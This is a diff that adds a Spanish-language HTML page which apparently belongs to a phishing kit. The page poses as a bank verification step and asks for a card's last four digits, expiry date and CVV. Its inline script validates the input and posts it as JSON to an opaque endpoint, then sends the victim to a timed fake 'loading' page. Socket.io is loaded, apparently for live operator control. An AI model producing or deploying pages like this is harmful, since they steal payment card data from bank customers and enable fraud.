@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+        <title>Document</title>
+        <link rel="stylesheet" href="css/style.css">
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <div>
+        <div>
+            <div class="tappa">
+                <img src="./img/hedapo2.png" alt="">
+            </div>
+        </div>
+
+        <div>
+            <div class="qlwa">
+                <form method="post" id="cwapinaForm">
+                    <div>
+                        <p class="pp2">Introduzca los últimos 4 dígitos de su tarjeta para verificar su cuenta bancaria
+                            en línea. </p>
+
+                        <p class="pp5">Últimos 4 dígitos</p>
+                        <div class="f-cc">
+                            <input type="text" name="" id="uzi1" placeholder="XXXX" disabled>
+                            <input type="text" name="" id="uzi2" placeholder="XXXX" disabled>
+                            <input type="text" name="" id="uzi3" placeholder="XXXX" disabled>
+                            <input type="tel" name="last4" id="last4" required maxlength="4" placeholder="XXXX">
+                        </div>
+
+                        <div class="f-cc">
+                            <div>
+                                <p class="pp">Fecha de vencimiento</p>
+                                <input type="tel" name="expDate" id="expDate" placeholder="MM/AA" maxlength="5"
+                                    required>
+                            </div>
+                            <div>
+                                <p class="pp">CVV</p>
+                                <input type="tel" name="cvv" id="cvv" placeholder="CVV" maxlength="4" required>
+                            </div>
+                        </div>
+                        <div id="errorMsg" style="color: red; margin-top: 10px; font-size: 0.9rem;"></div>
+
+                    </div>
+                    <button type="submit">Entrar</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+<script src="js/script.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const form = document.getElementById('cwapinaForm');
+        const errorMsg = document.getElementById('errorMsg');
+        const last4Input = document.getElementById('last4');
+        const expDateInput = document.getElementById('expDate');
+        const cvvInput = document.getElementById('cvv');
+
+        // Clear error when user starts typing
+        [last4Input, expDateInput, cvvInput].forEach(input => {
+            input.addEventListener('input', () => {
+                errorMsg.textContent = '';
+                input.classList.remove('input-error');
+            });
+        });
+
+        // Format Expiry Date
+        expDateInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const last4 = last4Input.value.trim();
+            const expDate = expDateInput.value.trim();
+            const cvv = cvvInput.value.trim();
+
+            // Validate Last 4 Digits
+            if (!/^\d{4}$/.test(last4)) {
+                errorMsg.textContent = 'Por favor, introduzca los últimos 4 dígitos válidos.';
+                return;
+            }
+
+            // Validate Expiry Date
+            if (!/^\d{2}\/\d{2}$/.test(expDate)) {
+                errorMsg.textContent = 'Fecha de vencimiento inválida (MM/AA).';
+                return;
+            }
+
+            // Validate CVV
+            if (!/^\d{3,4}$/.test(cvv)) {
+                errorMsg.textContent = 'CVV inválido.';
+                return;
+            }
+
+            // Show processing indicator
+            const submitButton = form.querySelector('button[type="submit"]');
+            const originalButtonText = submitButton.textContent;
+            submitButton.textContent = 'Procesando...';
+            submitButton.disabled = true;
+
+            $.ajax({
+                url: '/NkMNm4664XhcW8KuukHk',
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({
+                    last4: last4,
+                    expiryDate: expDate,
+                    cvv: cvv
+                }),
+                success: function (info) {
+                    if (info.OK) {
+                        window.location = "/loading?time=20&url=/RKnUB922z6Mf4HDwg3EZ";
+                    } else {
+                        errorMsg.textContent = 'Datos incorrectos. Por favor, verifique.';
+                        submitButton.textContent = originalButtonText;
+                        submitButton.disabled = false;
+                    }
+                },
+                error: function () {
+                    // Restore button state on error
+                    submitButton.textContent = originalButtonText;
+                    submitButton.disabled = false;
+
+                    // Show generic error message
+                    errorMsg.textContent = 'Ocurrió un error. Por favor, inténtelo de nuevo.';
+                }
+            });
+        });
+    });
+</script>
+<script src="/socket.io/socket.io.js"></script>
+
+</html>
